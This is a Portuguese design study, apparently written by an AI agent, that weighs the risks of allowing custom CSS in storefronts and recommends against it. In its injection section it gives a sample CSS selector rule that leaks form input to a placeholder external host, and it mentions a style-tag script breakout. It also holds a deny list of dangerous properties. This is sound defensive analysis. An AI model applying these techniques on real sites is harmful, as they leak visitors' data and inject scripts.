# 127 [H7-CUSTOM-CSS] — Estudo de CSS personalizado (11/11/2026)

**Estado: somente estudo.** Nada deste documento libera CSS personalizado, cria conta, contrata serviço ou muda preço, limite, comissão, trava ou flag. É o documento pedido pelo item 127 da fila ("Somente documento: riscos às regras de design, contraste, foco, legibilidade, injeção/recursos externos, suporte, desempenho e orçamento; nenhuma liberação de CSS agora"). Escrito por Claude 4 (nuvem B).

## 1. O que existe hoje (conferido no código em 11/11/2026)

O criador personaliza a página da loja só por escolhas fechadas, em `lib/store-look.ts`:

- **Tema** (`THEMES`), **fonte** (`FONTS`) e **fundo** (`BACKDROPS`), cada um de uma lista.
- **Uma cor livre** (`accent`, seis dígitos hexadecimais). A cor escolhida é o ponto de partida: cada cor que a página pinta é derivada dela e movida só o necessário até passar no contraste exigido. Botão, texto na cor do criador e texto pequeno ficam em 7:1 (WCAG 1.4.6, AAA, regra AX274), a borda de botão em 3:1 (`lookColours`, `contrast`). O estúdio faz a mesma conta no navegador para a prévia.
- O selo "Made with Marktmorgen" e a contagem de vendidos são opções com regra própria (`badge`, `sold`).

Não há campo de CSS livre em nenhuma página. Isso é o que faz as garantias de contraste, foco e legibilidade valerem **para toda loja, por construção**, e não só para as lojas que se cuidam.

## 2. Riscos de liberar CSS livre

### 2.1 Acessibilidade (AX274, WCAG 2.2 AAA em todas as páginas)

Um CSS escrito pelo criador pode desfazer, sem aviso, cada garantia que hoje vale por construção:

- **Contraste** (1.4.6, 1.4.11): qualquer `color` ou `background` volta a ser livre. A derivação de `lookColours` deixa de ser a última palavra.
- **Foco visível e destacado** (2.4.7, 2.4.13): `outline: none` em um seletor amplo apaga o foco de toda a página para quem usa teclado.
- **Alvos de 44 × 44 px** (2.5.5), **espaçamento de texto** (1.4.12), **reflow em 320 px e zoom de 400%** (1.4.10): larguras fixas, `font-size` em `px` e `overflow: hidden` quebram tudo isso.
- **Movimento** (2.3.3) e **nada piscando** (2.3.2): `@keyframes` e `animation` ignoram `prefers-reduced-motion` se o criador não lembrar.
- **Alto contraste do sistema** (`forced-colors`) e **modo escuro**: um CSS pensado para um tema quebra no outro.
- **Ordem visual diferente da ordem do código** (1.3.2, 2.4.3): `order`, `position` e `float` podem pôr na tela uma ordem que o leitor de tela não segue.
- **O link de pular para o conteúdo** e as regiões nomeadas podem ser escondidos com `display: none`.

Nenhuma verificação automática prova AAA depois de um CSS arbitrário. Testes automáticos não equivalem a conformidade (AX274, item 7), e a impossibilidade de verificar não pode ser presumida como aprovação.

### 2.2 Verdade diante do cliente (VR, item 2) e avisos obrigatórios

O CSS esconde ou disfarça, sem mudar uma linha do texto, o que a página **tem** de mostrar ao comprador:

- o preço e o imposto cobrado por fora do preço;
- os termos, a política de reembolso e a identificação do vendedor;
- o rótulo de resposta gerada por IA do assistente, que é desenhado pela página justamente para o modelo não poder tirá-lo (`ASSISTANT_LABEL`);
- os avisos de consentimento (caixas desmarcadas) e de "não é promessa de resultado".

`content:` em `::before` e `::after` também **acrescenta** texto que não está no código, como um selo falso, um "official", um prazo inventado ou um número que não é real. Isso fere a regra de nada de faz de conta e as proibições de urgência, escassez e depoimento inventados.

### 2.3 Injeção e recursos externos

- **Fuga do bloco de estilo:** um CSS posto dentro de `<style>` sem tratamento pode conter `</style><script>…`. É injeção de HTML e de script na página da loja e no checkout embutido.
- **Exfiltração por seletores:** regras como `input[value^="a"] { background: url(https://exemplo.invalido/a) }` vazam, letra por letra, o que está num campo da página (um e-mail digitado, um token de formulário) para um servidor de fora, sem script nenhum.
- **Carga de terceiros sem consentimento:** `url()`, `@import` e `@font-face` com endereço de fora fazem o navegador de **todo visitante** chamar outro servidor, que recebe o IP e o navegador. A política de privacidade (`app/privacy/page.tsx`, seção dos pixels) decide quando terceiros carregam: no EEE, no Reino Unido, na Suíça, no Brasil e em país desconhecido, só com o consentimento de medição do visitante; nos demais lugares, os pixels carregam, salvo se o navegador enviar Global Privacy Control. CSS com recurso externo contornaria essa escolha nos dois casos.
- **Sobreposição enganosa:** `position: fixed` com `z-index` alto põe por cima do checkout ou do botão de pagar um elemento que parece da página. É o mesmo efeito de um clickjacking, feito de dentro.

### 2.4 Suporte, desempenho e custo

- **Suporte:** cada loja com CSS próprio é uma página diferente. Um ajuste de layout do Marktmorgen pode quebrar lojas sem aviso, e a pergunta "por que minha loja ficou assim" passa a depender de ler o CSS de cada um. Isso é trabalho manual do dono, contrário à regra de zero trabalho manual.
- **Desempenho (AX274, celular simples e rede lenta):** seletores caros (`:has()` amplo, universais encadeados), animações contínuas e fontes externas pesam em cada visita.
- **Custo (MR):** guardar o CSS (bytes por loja, na sala de dados), validar e higienizar a cada gravação (CPU), servir e revisar. **Nenhum desses custos foi calculado**, e custo desconhecido reprova. O cálculo completo, por plano no pior mês, mensal e anual, é condição de qualquer passo futuro, nunca deste estudo.

## 3. Onde CSS do criador nunca poderia ir

Mesmo numa liberação futura, ficam fora: o checkout e o checkout embutido no site do criador, a área do comprador, as páginas legais (termos, privacidade, reembolso), as páginas de erro, os e-mails, os PDFs e todo texto ou rótulo que a lei ou as regras deste repositório mandam mostrar.

## 4. Alternativa recomendada: mais escolhas fechadas, não CSS livre

O que o criador procura com CSS (marca própria, ritmo, densidade) pode vir de mais escolhas como as de hoje. Cada escolha teria o valor final derivado e conferido por código, do mesmo jeito que a cor:

- espaçamento (compacto, padrão, amplo), com mínimos de 1.4.12 garantidos;
- raio dos cantos e estilo de botão (cheio, contorno), com 3:1 na borda e 7:1 no texto;
- largura de leitura (estreita, padrão), sempre com no máximo 80 caracteres por linha (1.4.8);
- mais fontes da lista, servidas por nós, nunca por terceiros.

Cada uma é testável como `lookColours` é testada, funciona igual na prévia e na loja, e não abre nenhum dos riscos da seção 2.

## 5. Condições mínimas se um dia o dono quiser CSS livre (para registro, não recomendado)

1. Decisão expressa do dono, depois do cálculo completo de custo (seção 2.4).
2. CSS só dentro de um contêiner da página da loja, nunca nas áreas da seção 3.
3. Lista fechada de propriedades. Proibidos: `url()`, `@import`, `@font-face`, `content`, `position: fixed/sticky`, `z-index`, `animation` sem `prefers-reduced-motion`, seletores de atributo de campos e `outline: none`.
4. Higienização por um analisador de CSS de verdade (nunca por expressão regular) e saída serializada pelo próprio analisador. Teto de bytes por loja contado na sala de dados.
5. Verificação automática de contraste e foco na prévia, avisando o criador. A conformidade AAA continuaria **não provada**, e a página teria de dizer isso internamente, nunca "accessible" em público (AX274, item 7).

## 6. Conclusão

**Não liberar CSS livre.** Os riscos das seções 2.1 a 2.3 atingem regras vinculantes (AX274, VR, privacidade) e não têm verificação automática que os feche. O custo da seção 2.4 é desconhecido e, portanto, reprova. O caminho com benefício real e sem esses riscos é a seção 4, a ser registrada como item próprio se o dono quiser.

Nada foi alterado no código por este estudo. Estado VR: documento; nenhum recurso novo ao cliente.
